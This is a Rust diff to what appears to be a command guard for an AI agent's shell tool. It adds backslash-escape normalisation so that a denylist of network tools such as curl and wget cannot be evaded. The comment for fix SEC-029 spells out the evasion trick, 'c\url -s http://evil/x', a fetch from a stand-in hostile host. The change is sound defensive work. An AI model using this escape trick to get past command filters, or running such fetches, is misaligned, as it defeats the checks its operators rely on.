@@ -187,7 +187,7 @@ fn windows_state_dir() -> Result<PathBuf> {
 /// The directory is created 0700 under `target/temp` (the project's sanctioned
 /// scratch location) and falls back to a per-uid subdirectory of the system
 /// temp directory when no `target` directory can be created.
-fn bash_scratch_dir() -> PathBuf {
+pub fn bash_scratch_dir() -> PathBuf {
     let base = std::env::current_dir()
         .map(|cwd| cwd.join("target").join("temp"))
         .unwrap_or_else(|_| std::env::temp_dir());
@@ -773,11 +773,38 @@ fn contains_denied_command(cmd: &str) -> bool {
     false
 }
 
+/// Remove unquoted backslash escapes so `c\url` normalises to `curl` (SEC-029).
+///
+/// A shell strips backslashes before executing, so the literal substring scan in
+/// [`contains_banned_command`] can be defeated by `c\url -s http://evil/x`. This
+/// decodes a backslash before a non-special character (leaving the argument
+/// separators themselves) so the denied/banned scan sees the effective command.
+fn strip_unquoted_backslash_escapes(cmd: &str) -> String {
+    let mut out = String::with_capacity(cmd.len());
+    let mut chars = cmd.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\\'
+            && let Some(&next) = chars.peek()
+            && next.is_ascii_alphanumeric()
+        {
+            // `\u` -> `u` (bash removes the backslash).
+            out.push(next);
+            chars.next();
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
 /// Check if command uses a banned tool (e.g., curl, wget).
 fn contains_banned_command(cmd: &str) -> bool {
     // Strip heredoc bodies first so that literal data inside a heredoc
     // (e.g. Rust string escapes like `\nc\n`) cannot trigger false positives.
     let cmd_stripped = strip_heredoc_bodies(cmd);
+    // SEC-029: decode backslash escapes before scanning, so `c\url` cannot evade
+    // the denylist (which bash would execute as `curl`).
+    let cmd_stripped = strip_unquoted_backslash_escapes(&cmd_stripped);
     let cmd_lower = cmd_stripped.trim().to_lowercase();
     let bytes = cmd_lower.as_bytes();
     let clen = bytes.len();
